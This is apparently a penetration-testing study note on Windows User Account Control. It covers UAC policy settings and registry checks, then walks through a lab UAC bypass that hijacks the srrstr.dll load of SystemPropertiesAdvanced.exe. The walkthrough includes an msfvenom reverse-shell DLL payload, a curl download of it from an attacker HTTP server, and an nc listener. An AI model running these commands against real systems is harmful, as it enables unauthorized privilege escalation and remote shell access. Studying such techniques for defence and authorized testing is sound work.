---
title: User Account Control (UAC)
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - windows
  - privilege
---
# User Account Control (UAC)

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is a feature that enables a consent prompt for elevated activities. When UAC is in place, a user can log into their system with their standard user account. When processes are launched using a standard user token, they can perform tasks using the rights granted to a standard user. Some applications require additional permissions to run, and UAC can provide additional access rights to the token for them to run correctly.

## How it works

This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discusses how UAC works in great depth and includes the logon process, user experience, and UAC architecture. Administrators can use security policies to configure how UAC works specific to their organization at the local level (using secpol.msc), or configured and pushed out via Group Policy Objects (GPO) in an Active Directory domain environment. The various settings are discussed in detail [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings).

There are 10 Group Policy settings that can be set for UAC. The following table provides additional detail: [Source](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings)

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |

UAC should be enabled, and although it may not stop an attacker from gaining privileges, it is an extra step that may slow this process down and force them to become noisier.

The `default RID 500 administrator` account always operates at the high mandatory level. With Admin Approval Mode (AAM) enabled, any new admin accounts we create will operate at the medium mandatory level by default and be assigned two separate access tokens upon logging in.


**Checking Current User**

```cmd-session
whoami /user
```

Output:

```cmd-session
USER INFORMATION
----------------

User Name         SID
================= ==============================================
winlpe-ws03\sarah S-1-5-21-3159276091-2191180989-3781274054-1002
```

**Confirming Admin Group Membership:**

```cmd-session
net localgroup administrators
```

Output:

```cmd-session
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
mrb3n
sarah
The command completed successfully.
```

**Reviewing User Privileges:**

```cmd-session
whoami /priv
```

**Confirming UAC is Enabled:**

```cmd-session
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```

Output:

```
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```

REG_DWORD 0x1: The value 1 means UAC is turned ON.

**Checking UAC Level**:

```cmd-session
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

Output:

```
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```

The value of `ConsentPromptBehaviorAdmin` is `0x5`, which means the highest UAC level of `Always notify` is enabled. There are fewer UAC bypasses at this highest level.

**Checking Windows Version:**

```powershell
[environment]::OSVersion.Version
```

Output:

```

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

To match the Build with the version see: [https://en.wikipedia.org/wiki/Windows_10_version_history](https://en.wikipedia.org/wiki/Windows_10_version_history)

The UACME project (see below) maintains a list of UAC bypasses, including information on the affected Windows build number, the technique used, and if Microsoft has issued a security update to fix it.

## SystemPropertiesAdvanced.exe DLL Hijacking UAC Bypass

Auto-elevating binaries technique

The 32-bit version of `SystemPropertiesAdvanced.exe` attempts to load the non-existent DLL srrstr.dll, which is used by System Restore functionality.

When attempting to locate a DLL, Windows will use the following search order.

1. The directory from which the application loaded.
2. The system directory `C:\Windows\System32` for 64-bit systems.
3. The 16-bit system directory `C:\Windows\System` (not supported on 64-bit systems)
4. The Windows directory.
5. Any directories that are listed in the PATH environment variable.


### Reviewing Path Variable

```powershell
cmd /c echo %PATH%
```

This reveals the default folders below.

If we see a folder within the user's profile and writable by the user (in the example, the `WindowsApps` folder), we can potentially bypass UAC in this by using DLL hijacking by placing a malicious `srrstr.dll` DLL to `WindowsApps` folder, which will be loaded in an elevated context.

### Generating Malicious srrstr.dll DLL

```shell-session
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
```

### Starting Python HTTP Server on Attack Host

```shell-session
sudo python3 -m http.server 8080
```


### Downloading DLL Target

Download the malicious DLL to the target system.

```powershell
curl http://10.10.14.158:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

Note that we will be using the path of the writable folder that is included within the PATH variable.

### Starting nc Listener on Attack Host

```shell-session
nc -lvnp 8443
```

### Testing Connection

We can run the DLL using rundll32.exe to get a reverse shell connection.

```cmd-session
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

Once we get a connection back, we'll see normal user rights:

```shell-session
whoami /priv
```

### Executing SystemPropertiesAdvanced.exe on Target Host

Before proceeding, we should ensure that any instances of the rundll32 process from our previous execution have been terminated.

```cmd
tasklist /svc | findstr "rundll32"
```

Output:

```cmd
rundll32.exe                  6300 N/A
rundll32.exe                  5360 N/A
rundll32.exe                  7044 N/A
```

Therefore, killing the processes:

```cmd
taskkill /PID 7044 /F
taskkill /PID 6300 /F
taskkill /PID 5360 /F
```

Now, we can try the 32-bit version of `SystemPropertiesAdvanced.exe` from the target host (don't forget to previously set the listener):

```cmd
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```



## UAC bypasses


### UACME

The [UACME](https://github.com/hfiref0x/UACME) project maintains a list of UAC bypasses, including information on the affected Windows build number, the technique used, and if Microsoft has issued a security update to fix it.

Repo: [https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)

```
git clone https://github.com/hfiref0x/UACME.git
```